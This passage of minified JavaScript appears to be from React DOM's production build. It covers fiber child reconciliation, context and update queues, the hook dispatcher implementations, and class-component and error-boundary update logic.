        if (typeof p == "string" && p !== "" || typeof p == "number")
            return k !== null ? null : s(f, c, "" + p, y);
        if (typeof p == "object" && p !== null) {
            switch (p.$$typeof) {
            case Sr:
                return p.key === k ? a(f, c, p, y) : null;
            case Kt:
                return p.key === k ? d(f, c, p, y) : null;
            case ut:
                return k = p._init,
                m(f, c, k(p._payload), y)
            }
            if (An(p) || En(p))
                return k !== null ? null : h(f, c, p, y, null);
            Rr(f, p)
        }
        return null
    }
    function x(f, c, p, y, k) {
        if (typeof y == "string" && y !== "" || typeof y == "number")
            return f = f.get(p) || null,
            s(c, f, "" + y, k);
        if (typeof y == "object" && y !== null) {
            switch (y.$$typeof) {
            case Sr:
                return f = f.get(y.key === null ? p : y.key) || null,
                a(c, f, y, k);
            case Kt:
                return f = f.get(y.key === null ? p : y.key) || null,
                d(c, f, y, k);
            case ut:
                var j = y._init;
                return x(f, c, p, j(y._payload), k)
            }
            if (An(y) || En(y))
                return f = f.get(p) || null,
                h(c, f, y, k, null);
            Rr(c, y)
        }
        return null
    }
    function w(f, c, p, y) {
        for (var k = null, j = null, C = c, z = c = 0, F = null; C !== null && z < p.length; z++) {
            C.index > z ? (F = C,
            C = null) : F = C.sibling;
            var L = m(f, C, p[z], y);
            if (L === null) {
                C === null && (C = F);
                break
            }
            e && C && L.alternate === null && t(f, C),
            c = o(L, c, z),
            j === null ? k = L : j.sibling = L,
            j = L,
            C = F
        }
        if (z === p.length)
            return n(f, C),
            W && Tt(f, z),
            k;
        if (C === null) {
            for (; z < p.length; z++)
                C = g(f, p[z], y),
                C !== null && (c = o(C, c, z),
                j === null ? k = C : j.sibling = C,
                j = C);
            return W && Tt(f, z),
            k
        }
        for (C = r(f, C); z < p.length; z++)
            F = x(C, f, z, p[z], y),
            F !== null && (e && F.alternate !== null && C.delete(F.key === null ? z : F.key),
            c = o(F, c, z),
            j === null ? k = F : j.sibling = F,
            j = F);
        return e && C.forEach(function(se) {
            return t(f, se)
        }),
        W && Tt(f, z),
        k
    }
    function v(f, c, p, y) {
        var k = En(p);
        if (typeof k != "function")
            throw Error(S(150));
        if (p = k.call(p),
        p == null)
            throw Error(S(151));
        for (var j = k = null, C = c, z = c = 0, F = null, L = p.next(); C !== null && !L.done; z++,
        L = p.next()) {
            C.index > z ? (F = C,
            C = null) : F = C.sibling;
            var se = m(f, C, L.value, y);
            if (se === null) {
                C === null && (C = F);
                break
            }
            e && C && se.alternate === null && t(f, C),
            c = o(se, c, z),
            j === null ? k = se : j.sibling = se,
            j = se,
            C = F
        }
        if (L.done)
            return n(f, C),
            W && Tt(f, z),
            k;
        if (C === null) {
            for (; !L.done; z++,
            L = p.next())
                L = g(f, L.value, y),
                L !== null && (c = o(L, c, z),
                j === null ? k = L : j.sibling = L,
                j = L);
            return W && Tt(f, z),
            k
        }
        for (C = r(f, C); !L.done; z++,
        L = p.next())
            L = x(C, f, z, L.value, y),
            L !== null && (e && L.alternate !== null && C.delete(L.key === null ? z : L.key),
            c = o(L, c, z),
            j === null ? k = L : j.sibling = L,
            j = L);
        return e && C.forEach(function(D) {
            return t(f, D)
        }),
        W && Tt(f, z),
        k
    }
    function N(f, c, p, y) {
        if (typeof p == "object" && p !== null && p.type === Yt && p.key === null && (p = p.props.children),
        typeof p == "object" && p !== null) {
            switch (p.$$typeof) {
            case Sr:
                e: {
                    for (var k = p.key, j = c; j !== null; ) {
                        if (j.key === k) {
                            if (k = p.type,
                            k === Yt) {
                                if (j.tag === 7) {
                                    n(f, j.sibling),
                                    c = l(j, p.props.children),
                                    c.return = f,
                                    f = c;
                                    break e
                                }
                            } else if (j.elementType === k || typeof k == "object" && k !== null && k.$$typeof === ut && Bs(k) === j.type) {
                                n(f, j.sibling),
                                c = l(j, p.props),
                                c.ref = Tn(f, j, p),
                                c.return = f,
                                f = c;
                                break e
                            }
                            n(f, j);
                            break
                        } else
                            t(f, j);
                        j = j.sibling
                    }
                    p.type === Yt ? (c = At(p.props.children, f.mode, y, p.key),
                    c.return = f,
                    f = c) : (y = Yr(p.type, p.key, p.props, null, f.mode, y),
                    y.ref = Tn(f, c, p),
                    y.return = f,
                    f = y)
                }
                return i(f);
            case Kt:
                e: {
                    for (j = p.key; c !== null; ) {
                        if (c.key === j)
                            if (c.tag === 4 && c.stateNode.containerInfo === p.containerInfo && c.stateNode.implementation === p.implementation) {
                                n(f, c.sibling),
                                c = l(c, p.children || []),
                                c.return = f,
                                f = c;
                                break e
                            } else {
                                n(f, c);
                                break
                            }
                        else
                            t(f, c);
                        c = c.sibling
                    }
                    c = fo(p, f.mode, y),
                    c.return = f,
                    f = c
                }
                return i(f);
            case ut:
                return j = p._init,
                N(f, c, j(p._payload), y)
            }
            if (An(p))
                return w(f, c, p, y);
            if (En(p))
                return v(f, c, p, y);
            Rr(f, p)
        }
        return typeof p == "string" && p !== "" || typeof p == "number" ? (p = "" + p,
        c !== null && c.tag === 6 ? (n(f, c.sibling),
        c = l(c, p),
        c.return = f,
        f = c) : (n(f, c),
        c = co(p, f.mode, y),
        c.return = f,
        f = c),
        i(f)) : n(f, c)
    }
    return N
}
var yn = za(!0)
  , Pa = za(!1)
  , cl = Ct(null)
  , dl = null
  , ln = null
  , Li = null;
function Ti() {
    Li = ln = dl = null
}
function Mi(e) {
    var t = cl.current;
    V(cl),
    e._currentValue = t
}
function Vo(e, t, n) {
    for (; e !== null; ) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t,
        r !== null && (r.childLanes |= t)) : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
        e === n)
            break;
        e = e.return
    }
}
function fn(e, t) {
    dl = e,
    Li = ln = null,
    e = e.dependencies,
    e !== null && e.firstContext !== null && (e.lanes & t && (ve = !0),
    e.firstContext = null)
}
function Te(e) {
    var t = e._currentValue;
    if (Li !== e)
        if (e = {
            context: e,
            memoizedValue: t,
            next: null
        },
        ln === null) {
            if (dl === null)
                throw Error(S(308));
            ln = e,
            dl.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else
            ln = ln.next = e;
    return t
}
var It = null;
function Ri(e) {
    It === null ? It = [e] : It.push(e)
}
function La(e, t, n, r) {
    var l = t.interleaved;
    return l === null ? (n.next = n,
    Ri(t)) : (n.next = l.next,
    l.next = n),
    t.interleaved = n,
    et(e, r)
}
function et(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t),
    n = e,
    e = e.return; e !== null; )
        e.childLanes |= t,
        n = e.alternate,
        n !== null && (n.childLanes |= t),
        n = e,
        e = e.return;
    return n.tag === 3 ? n.stateNode : null
}
var at = !1;
function Ii(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}
function Ta(e, t) {
    e = e.updateQueue,
    t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}
function Xe(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}
function yt(e, t, n) {
    var r = e.updateQueue;
    if (r === null)
        return null;
    if (r = r.shared,
    O & 2) {
        var l = r.pending;
        return l === null ? t.next = t : (t.next = l.next,
        l.next = t),
        r.pending = t,
        et(e, n)
    }
    return l = r.interleaved,
    l === null ? (t.next = t,
    Ri(r)) : (t.next = l.next,
    l.next = t),
    r.interleaved = t,
    et(e, n)
}
function Wr(e, t, n) {
    if (t = t.updateQueue,
    t !== null && (t = t.shared,
    (n & 4194240) !== 0)) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        xi(e, n)
    }
}
function $s(e, t) {
    var n = e.updateQueue
      , r = e.alternate;
    if (r !== null && (r = r.updateQueue,
    n === r)) {
        var l = null
          , o = null;
        if (n = n.firstBaseUpdate,
        n !== null) {
            do {
                var i = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                o === null ? l = o = i : o = o.next = i,
                n = n.next
            } while (n !== null);
            o === null ? l = o = t : o = o.next = t
        } else
            l = o = t;
        n = {
            baseState: r.baseState,
            firstBaseUpdate: l,
            lastBaseUpdate: o,
            shared: r.shared,
            effects: r.effects
        },
        e.updateQueue = n;
        return
    }
    e = n.lastBaseUpdate,
    e === null ? n.firstBaseUpdate = t : e.next = t,
    n.lastBaseUpdate = t
}
function fl(e, t, n, r) {
    var l = e.updateQueue;
    at = !1;
    var o = l.firstBaseUpdate
      , i = l.lastBaseUpdate
      , s = l.shared.pending;
    if (s !== null) {
        l.shared.pending = null;
        var a = s
          , d = a.next;
        a.next = null,
        i === null ? o = d : i.next = d,
        i = a;
        var h = e.alternate;
        h !== null && (h = h.updateQueue,
        s = h.lastBaseUpdate,
        s !== i && (s === null ? h.firstBaseUpdate = d : s.next = d,
        h.lastBaseUpdate = a))
    }
    if (o !== null) {
        var g = l.baseState;
        i = 0,
        h = d = a = null,
        s = o;
        do {
            var m = s.lane
              , x = s.eventTime;
            if ((r & m) === m) {
                h !== null && (h = h.next = {
                    eventTime: x,
                    lane: 0,
                    tag: s.tag,
                    payload: s.payload,
                    callback: s.callback,
                    next: null
                });
                e: {
                    var w = e
                      , v = s;
                    switch (m = t,
                    x = n,
                    v.tag) {
                    case 1:
                        if (w = v.payload,
                        typeof w == "function") {
                            g = w.call(x, g, m);
                            break e
                        }
                        g = w;
                        break e;
                    case 3:
                        w.flags = w.flags & -65537 | 128;
                    case 0:
                        if (w = v.payload,
                        m = typeof w == "function" ? w.call(x, g, m) : w,
                        m == null)
                            break e;
                        g = G({}, g, m);
                        break e;
                    case 2:
                        at = !0
                    }
                }
                s.callback !== null && s.lane !== 0 && (e.flags |= 64,
                m = l.effects,
                m === null ? l.effects = [s] : m.push(s))
            } else
                x = {
                    eventTime: x,
                    lane: m,
                    tag: s.tag,
                    payload: s.payload,
                    callback: s.callback,
                    next: null
                },
                h === null ? (d = h = x,
                a = g) : h = h.next = x,
                i |= m;
            if (s = s.next,
            s === null) {
                if (s = l.shared.pending,
                s === null)
                    break;
                m = s,
                s = m.next,
                m.next = null,
                l.lastBaseUpdate = m,
                l.shared.pending = null
            }
        } while (!0);
        if (h === null && (a = g),
        l.baseState = a,
        l.firstBaseUpdate = d,
        l.lastBaseUpdate = h,
        t = l.shared.interleaved,
        t !== null) {
            l = t;
            do
                i |= l.lane,
                l = l.next;
            while (l !== t)
        } else
            o === null && (l.shared.lanes = 0);
        Ut |= i,
        e.lanes = i,
        e.memoizedState = g
    }
}
function Us(e, t, n) {
    if (e = t.effects,
    t.effects = null,
    e !== null)
        for (t = 0; t < e.length; t++) {
            var r = e[t]
              , l = r.callback;
            if (l !== null) {
                if (r.callback = null,
                r = n,
                typeof l != "function")
                    throw Error(S(191, l));
                l.call(r)
            }
        }
}
var gr = {}
  , He = Ct(gr)
  , ir = Ct(gr)
  , sr = Ct(gr);
function Ot(e) {
    if (e === gr)
        throw Error(S(174));
    return e
}
function Oi(e, t) {
    switch ($(sr, t),
    $(ir, e),
    $(He, gr),
    e = t.nodeType,
    e) {
    case 9:
    case 11:
        t = (t = t.documentElement) ? t.namespaceURI : No(null, "");
        break;
    default:
        e = e === 8 ? t.parentNode : t,
        t = e.namespaceURI || null,
        e = e.tagName,
        t = No(t, e)
    }
    V(He),
    $(He, t)
}
function xn() {
    V(He),
    V(ir),
    V(sr)
}
function Ma(e) {
    Ot(sr.current);
    var t = Ot(He.current)
      , n = No(t, e.type);
    t !== n && ($(ir, e),
    $(He, n))
}
function Di(e) {
    ir.current === e && (V(He),
    V(ir))
}
var H = Ct(0);
function pl(e) {
    for (var t = e; t !== null; ) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && (n = n.dehydrated,
            n === null || n.data === "$?" || n.data === "$!"))
                return t
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128)
                return t
        } else if (t.child !== null) {
            t.child.return = t,
            t = t.child;
            continue
        }
        if (t === e)
            break;
        for (; t.sibling === null; ) {
            if (t.return === null || t.return === e)
                return null;
            t = t.return
        }
        t.sibling.return = t.return,
        t = t.sibling
    }
    return null
}
var lo = [];
function Ai() {
    for (var e = 0; e < lo.length; e++)
        lo[e]._workInProgressVersionPrimary = null;
    lo.length = 0
}
var Hr = rt.ReactCurrentDispatcher
  , oo = rt.ReactCurrentBatchConfig
  , $t = 0
  , Q = null
  , Z = null
  , te = null
  , ml = !1
  , Hn = !1
  , ur = 0
  , zf = 0;
function ue() {
    throw Error(S(321))
}
function Fi(e, t) {
    if (t === null)
        return !1;
    for (var n = 0; n < t.length && n < e.length; n++)
        if (!$e(e[n], t[n]))
            return !1;
    return !0
}
function Bi(e, t, n, r, l, o) {
    if ($t = o,
    Q = t,
    t.memoizedState = null,
    t.updateQueue = null,
    t.lanes = 0,
    Hr.current = e === null || e.memoizedState === null ? Mf : Rf,
    e = n(r, l),
    Hn) {
        o = 0;
        do {
            if (Hn = !1,
            ur = 0,
            25 <= o)
                throw Error(S(301));
            o += 1,
            te = Z = null,
            t.updateQueue = null,
            Hr.current = If,
            e = n(r, l)
        } while (Hn)
    }
    if (Hr.current = hl,
    t = Z !== null && Z.next !== null,
    $t = 0,
    te = Z = Q = null,
    ml = !1,
    t)
        throw Error(S(300));
    return e
}
function $i() {
    var e = ur !== 0;
    return ur = 0,
    e
}
function be() {
    var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
    };
    return te === null ? Q.memoizedState = te = e : te = te.next = e,
    te
}
function Me() {
    if (Z === null) {
        var e = Q.alternate;
        e = e !== null ? e.memoizedState : null
    } else
        e = Z.next;
    var t = te === null ? Q.memoizedState : te.next;
    if (t !== null)
        te = t,
        Z = e;
    else {
        if (e === null)
            throw Error(S(310));
        Z = e,
        e = {
            memoizedState: Z.memoizedState,
            baseState: Z.baseState,
            baseQueue: Z.baseQueue,
            queue: Z.queue,
            next: null
        },
        te === null ? Q.memoizedState = te = e : te = te.next = e
    }
    return te
}
function ar(e, t) {
    return typeof t == "function" ? t(e) : t
}
function io(e) {
    var t = Me()
      , n = t.queue;
    if (n === null)
        throw Error(S(311));
    n.lastRenderedReducer = e;
    var r = Z
      , l = r.baseQueue
      , o = n.pending;
    if (o !== null) {
        if (l !== null) {
            var i = l.next;
            l.next = o.next,
            o.next = i
        }
        r.baseQueue = l = o,
        n.pending = null
    }
    if (l !== null) {
        o = l.next,
        r = r.baseState;
        var s = i = null
          , a = null
          , d = o;
        do {
            var h = d.lane;
            if (($t & h) === h)
                a !== null && (a = a.next = {
                    lane: 0,
                    action: d.action,
                    hasEagerState: d.hasEagerState,
                    eagerState: d.eagerState,
                    next: null
                }),
                r = d.hasEagerState ? d.eagerState : e(r, d.action);
            else {
                var g = {
                    lane: h,
                    action: d.action,
                    hasEagerState: d.hasEagerState,
                    eagerState: d.eagerState,
                    next: null
                };
                a === null ? (s = a = g,
                i = r) : a = a.next = g,
                Q.lanes |= h,
                Ut |= h
            }
            d = d.next
        } while (d !== null && d !== o);
        a === null ? i = r : a.next = s,
        $e(r, t.memoizedState) || (ve = !0),
        t.memoizedState = r,
        t.baseState = i,
        t.baseQueue = a,
        n.lastRenderedState = r
    }
    if (e = n.interleaved,
    e !== null) {
        l = e;
        do
            o = l.lane,
            Q.lanes |= o,
            Ut |= o,
            l = l.next;
        while (l !== e)
    } else
        l === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch]
}
function so(e) {
    var t = Me()
      , n = t.queue;
    if (n === null)
        throw Error(S(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch
      , l = n.pending
      , o = t.memoizedState;
    if (l !== null) {
        n.pending = null;
        var i = l = l.next;
        do
            o = e(o, i.action),
            i = i.next;
        while (i !== l);
        $e(o, t.memoizedState) || (ve = !0),
        t.memoizedState = o,
        t.baseQueue === null && (t.baseState = o),
        n.lastRenderedState = o
    }
    return [o, r]
}
function Ra() {}
function Ia(e, t) {
    var n = Q
      , r = Me()
      , l = t()
      , o = !$e(r.memoizedState, l);
    if (o && (r.memoizedState = l,
    ve = !0),
    r = r.queue,
    Ui(Aa.bind(null, n, r, e), [e]),
    r.getSnapshot !== t || o || te !== null && te.memoizedState.tag & 1) {
        if (n.flags |= 2048,
        cr(9, Da.bind(null, n, r, l, t), void 0, null),
        ne === null)
            throw Error(S(349));
        $t & 30 || Oa(n, t, l)
    }
    return l
}
function Oa(e, t, n) {
    e.flags |= 16384,
    e = {
        getSnapshot: t,
        value: n
    },
    t = Q.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    Q.updateQueue = t,
    t.stores = [e]) : (n = t.stores,
    n === null ? t.stores = [e] : n.push(e))
}
function Da(e, t, n, r) {
    t.value = n,
    t.getSnapshot = r,
    Fa(t) && Ba(e)
}
function Aa(e, t, n) {
    return n(function() {
        Fa(t) && Ba(e)
    })
}
function Fa(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !$e(e, n)
    } catch {
        return !0
    }
}
function Ba(e) {
    var t = et(e, 1);
    t !== null && Be(t, e, 1, -1)
}
function bs(e) {
    var t = be();
    return typeof e == "function" && (e = e()),
    t.memoizedState = t.baseState = e,
    e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: ar,
        lastRenderedState: e
    },
    t.queue = e,
    e = e.dispatch = Tf.bind(null, Q, e),
    [t.memoizedState, e]
}
function cr(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    },
    t = Q.updateQueue,
    t === null ? (t = {
        lastEffect: null,
        stores: null
    },
    Q.updateQueue = t,
    t.lastEffect = e.next = e) : (n = t.lastEffect,
    n === null ? t.lastEffect = e.next = e : (r = n.next,
    n.next = e,
    e.next = r,
    t.lastEffect = e)),
    e
}
function $a() {
    return Me().memoizedState
}
function Qr(e, t, n, r) {
    var l = be();
    Q.flags |= e,
    l.memoizedState = cr(1 | t, n, void 0, r === void 0 ? null : r)
}
function zl(e, t, n, r) {
    var l = Me();
    r = r === void 0 ? null : r;
    var o = void 0;
    if (Z !== null) {
        var i = Z.memoizedState;
        if (o = i.destroy,
        r !== null && Fi(r, i.deps)) {
            l.memoizedState = cr(t, n, o, r);
            return
        }
    }
    Q.flags |= e,
    l.memoizedState = cr(1 | t, n, o, r)
}
function Vs(e, t) {
    return Qr(8390656, 8, e, t)
}
function Ui(e, t) {
    return zl(2048, 8, e, t)
}
function Ua(e, t) {
    return zl(4, 2, e, t)
}
function ba(e, t) {
    return zl(4, 4, e, t)
}
function Va(e, t) {
    if (typeof t == "function")
        return e = e(),
        t(e),
        function() {
            t(null)
        }
        ;
    if (t != null)
        return e = e(),
        t.current = e,
        function() {
            t.current = null
        }
}
function Wa(e, t, n) {
    return n = n != null ? n.concat([e]) : null,
    zl(4, 4, Va.bind(null, t, e), n)
}
function bi() {}
function Ha(e, t) {
    var n = Me();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && Fi(t, r[1]) ? r[0] : (n.memoizedState = [e, t],
    e)
}
function Qa(e, t) {
    var n = Me();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && Fi(t, r[1]) ? r[0] : (e = e(),
    n.memoizedState = [e, t],
    e)
}
function Ga(e, t, n) {
    return $t & 21 ? ($e(n, t) || (n = Zu(),
    Q.lanes |= n,
    Ut |= n,
    e.baseState = !0),
    t) : (e.baseState && (e.baseState = !1,
    ve = !0),
    e.memoizedState = n)
}
function Pf(e, t) {
    var n = B;
    B = n !== 0 && 4 > n ? n : 4,
    e(!0);
    var r = oo.transition;
    oo.transition = {};
    try {
        e(!1),
        t()
    } finally {
        B = n,
        oo.transition = r
    }
}
function qa() {
    return Me().memoizedState
}
function Lf(e, t, n) {
    var r = wt(e);
    if (n = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    },
    Ka(e))
        Ya(t, n);
    else if (n = La(e, t, n, r),
    n !== null) {
        var l = pe();
        Be(n, e, r, l),
        Xa(n, t, r)
    }
}
function Tf(e, t, n) {
    var r = wt(e)
      , l = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    };
    if (Ka(e))
        Ya(t, l);
    else {
        var o = e.alternate;
        if (e.lanes === 0 && (o === null || o.lanes === 0) && (o = t.lastRenderedReducer,
        o !== null))
            try {
                var i = t.lastRenderedState
                  , s = o(i, n);
                if (l.hasEagerState = !0,
                l.eagerState = s,
                $e(s, i)) {
                    var a = t.interleaved;
                    a === null ? (l.next = l,
                    Ri(t)) : (l.next = a.next,
                    a.next = l),
                    t.interleaved = l;
                    return
                }
            } catch {} finally {}
        n = La(e, t, l, r),
        n !== null && (l = pe(),
        Be(n, e, r, l),
        Xa(n, t, r))
    }
}
function Ka(e) {
    var t = e.alternate;
    return e === Q || t !== null && t === Q
}
function Ya(e, t) {
    Hn = ml = !0;
    var n = e.pending;
    n === null ? t.next = t : (t.next = n.next,
    n.next = t),
    e.pending = t
}
function Xa(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        r &= e.pendingLanes,
        n |= r,
        t.lanes = n,
        xi(e, n)
    }
}
var hl = {
    readContext: Te,
    useCallback: ue,
    useContext: ue,
    useEffect: ue,
    useImperativeHandle: ue,
    useInsertionEffect: ue,
    useLayoutEffect: ue,
    useMemo: ue,
    useReducer: ue,
    useRef: ue,
    useState: ue,
    useDebugValue: ue,
    useDeferredValue: ue,
    useTransition: ue,
    useMutableSource: ue,
    useSyncExternalStore: ue,
    useId: ue,
    unstable_isNewReconciler: !1
}
  , Mf = {
    readContext: Te,
    useCallback: function(e, t) {
        return be().memoizedState = [e, t === void 0 ? null : t],
        e
    },
    useContext: Te,
    useEffect: Vs,
    useImperativeHandle: function(e, t, n) {
        return n = n != null ? n.concat([e]) : null,
        Qr(4194308, 4, Va.bind(null, t, e), n)
    },
    useLayoutEffect: function(e, t) {
        return Qr(4194308, 4, e, t)
    },
    useInsertionEffect: function(e, t) {
        return Qr(4, 2, e, t)
    },
    useMemo: function(e, t) {
        var n = be();
        return t = t === void 0 ? null : t,
        e = e(),
        n.memoizedState = [e, t],
        e
    },
    useReducer: function(e, t, n) {
        var r = be();
        return t = n !== void 0 ? n(t) : t,
        r.memoizedState = r.baseState = t,
        e = {
            pending: null,
            interleaved: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: e,
            lastRenderedState: t
        },
        r.queue = e,
        e = e.dispatch = Lf.bind(null, Q, e),
        [r.memoizedState, e]
    },
    useRef: function(e) {
        var t = be();
        return e = {
            current: e
        },
        t.memoizedState = e
    },
    useState: bs,
    useDebugValue: bi,
    useDeferredValue: function(e) {
        return be().memoizedState = e
    },
    useTransition: function() {
        var e = bs(!1)
          , t = e[0];
        return e = Pf.bind(null, e[1]),
        be().memoizedState = e,
        [t, e]
    },
    useMutableSource: function() {},
    useSyncExternalStore: function(e, t, n) {
        var r = Q
          , l = be();
        if (W) {
            if (n === void 0)
                throw Error(S(407));
            n = n()
        } else {
            if (n = t(),
            ne === null)
                throw Error(S(349));
            $t & 30 || Oa(r, t, n)
        }
        l.memoizedState = n;
        var o = {
            value: n,
            getSnapshot: t
        };
        return l.queue = o,
        Vs(Aa.bind(null, r, o, e), [e]),
        r.flags |= 2048,
        cr(9, Da.bind(null, r, o, n, t), void 0, null),
        n
    },
    useId: function() {
        var e = be()
          , t = ne.identifierPrefix;
        if (W) {
            var n = Ye
              , r = Ke;
            n = (r & ~(1 << 32 - Fe(r) - 1)).toString(32) + n,
            t = ":" + t + "R" + n,
            n = ur++,
            0 < n && (t += "H" + n.toString(32)),
            t += ":"
        } else
            n = zf++,
            t = ":" + t + "r" + n.toString(32) + ":";
        return e.memoizedState = t
    },
    unstable_isNewReconciler: !1
}
  , Rf = {
    readContext: Te,
    useCallback: Ha,
    useContext: Te,
    useEffect: Ui,
    useImperativeHandle: Wa,
    useInsertionEffect: Ua,
    useLayoutEffect: ba,
    useMemo: Qa,
    useReducer: io,
    useRef: $a,
    useState: function() {
        return io(ar)
    },
    useDebugValue: bi,
    useDeferredValue: function(e) {
        var t = Me();
        return Ga(t, Z.memoizedState, e)
    },
    useTransition: function() {
        var e = io(ar)[0]
          , t = Me().memoizedState;
        return [e, t]
    },
    useMutableSource: Ra,
    useSyncExternalStore: Ia,
    useId: qa,
    unstable_isNewReconciler: !1
}
  , If = {
    readContext: Te,
    useCallback: Ha,
    useContext: Te,
    useEffect: Ui,
    useImperativeHandle: Wa,
    useInsertionEffect: Ua,
    useLayoutEffect: ba,
    useMemo: Qa,
    useReducer: so,
    useRef: $a,
    useState: function() {
        return so(ar)
    },
    useDebugValue: bi,
    useDeferredValue: function(e) {
        var t = Me();
        return Z === null ? t.memoizedState = e : Ga(t, Z.memoizedState, e)
    },
    useTransition: function() {
        var e = so(ar)[0]
          , t = Me().memoizedState;
        return [e, t]
    },
    useMutableSource: Ra,
    useSyncExternalStore: Ia,
    useId: qa,
    unstable_isNewReconciler: !1
};
function Oe(e, t) {
    if (e && e.defaultProps) {
        t = G({}, t),
        e = e.defaultProps;
        for (var n in e)
            t[n] === void 0 && (t[n] = e[n]);
        return t
    }
    return t
}
function Wo(e, t, n, r) {
    t = e.memoizedState,
    n = n(r, t),
    n = n == null ? t : G({}, t, n),
    e.memoizedState = n,
    e.lanes === 0 && (e.updateQueue.baseState = n)
}
var Pl = {
    isMounted: function(e) {
        return (e = e._reactInternals) ? Wt(e) === e : !1
    },
    enqueueSetState: function(e, t, n) {
        e = e._reactInternals;
        var r = pe()
          , l = wt(e)
          , o = Xe(r, l);
        o.payload = t,
        n != null && (o.callback = n),
        t = yt(e, o, l),
        t !== null && (Be(t, e, l, r),
        Wr(t, e, l))
    },
    enqueueReplaceState: function(e, t, n) {
        e = e._reactInternals;
        var r = pe()
          , l = wt(e)
          , o = Xe(r, l);
        o.tag = 1,
        o.payload = t,
        n != null && (o.callback = n),
        t = yt(e, o, l),
        t !== null && (Be(t, e, l, r),
        Wr(t, e, l))
    },
    enqueueForceUpdate: function(e, t) {
        e = e._reactInternals;
        var n = pe()
          , r = wt(e)
          , l = Xe(n, r);
        l.tag = 2,
        t != null && (l.callback = t),
        t = yt(e, l, r),
        t !== null && (Be(t, e, r, n),
        Wr(t, e, r))
    }
};
function Ws(e, t, n, r, l, o, i) {
    return e = e.stateNode,
    typeof e.shouldComponentUpdate == "function" ? e.shouldComponentUpdate(r, o, i) : t.prototype && t.prototype.isPureReactComponent ? !nr(n, r) || !nr(l, o) : !0
}
function Za(e, t, n) {
    var r = !1
      , l = Nt
      , o = t.contextType;
    return typeof o == "object" && o !== null ? o = Te(o) : (l = xe(t) ? Ft : de.current,
    r = t.contextTypes,
    o = (r = r != null) ? gn(e, l) : Nt),
    t = new t(n,o),
    e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null,
    t.updater = Pl,
    e.stateNode = t,
    t._reactInternals = e,
    r && (e = e.stateNode,
    e.__reactInternalMemoizedUnmaskedChildContext = l,
    e.__reactInternalMemoizedMaskedChildContext = o),
    t
}
function Hs(e, t, n, r) {
    e = t.state,
    typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r),
    typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r),
    t.state !== e && Pl.enqueueReplaceState(t, t.state, null)
}
function Ho(e, t, n, r) {
    var l = e.stateNode;
    l.props = n,
    l.state = e.memoizedState,
    l.refs = {},
    Ii(e);
    var o = t.contextType;
    typeof o == "object" && o !== null ? l.context = Te(o) : (o = xe(t) ? Ft : de.current,
    l.context = gn(e, o)),
    l.state = e.memoizedState,
    o = t.getDerivedStateFromProps,
    typeof o == "function" && (Wo(e, t, o, n),
    l.state = e.memoizedState),
    typeof t.getDerivedStateFromProps == "function" || typeof l.getSnapshotBeforeUpdate == "function" || typeof l.UNSAFE_componentWillMount != "function" && typeof l.componentWillMount != "function" || (t = l.state,
    typeof l.componentWillMount == "function" && l.componentWillMount(),
    typeof l.UNSAFE_componentWillMount == "function" && l.UNSAFE_componentWillMount(),
    t !== l.state && Pl.enqueueReplaceState(l, l.state, null),
    fl(e, n, l, r),
    l.state = e.memoizedState),
    typeof l.componentDidMount == "function" && (e.flags |= 4194308)
}
function wn(e, t) {
    try {
        var n = ""
          , r = t;
        do
            n += sd(r),
            r = r.return;
        while (r);
        var l = n
    } catch (o) {
        l = `
Error generating stack: ` + o.message + `
` + o.stack
    }
    return {
        value: e,
        source: t,
        stack: l,
        digest: null
    }
}
function uo(e, t, n) {
    return {
        value: e,
        source: null,
        stack: n ?? null,
        digest: t ?? null
    }
}
function Qo(e, t) {
    try {
        console.error(t.value)
    } catch (n) {
        setTimeout(function() {
            throw n
        })
    }
}
var Of = typeof WeakMap == "function" ? WeakMap : Map;
function Ja(e, t, n) {
    n = Xe(-1, n),
    n.tag = 3,
    n.payload = {
        element: null
    };
    var r = t.value;
    return n.callback = function() {
        vl || (vl = !0,
        ni = r),
        Qo(e, t)
    }
    ,
    n
}
function ec(e, t, n) {
    n = Xe(-1, n),
    n.tag = 3;
    var r = e.type.getDerivedStateFromError;
    if (typeof r == "function") {
        var l = t.value;
        n.payload = function() {
            return r(l)
        }
        ,
        n.callback = function() {
            Qo(e, t)
        }
    }
    var o = e.stateNode;
    return o !== null && typeof o.componentDidCatch == "function" && (n.callback = function() {
        Qo(e, t),
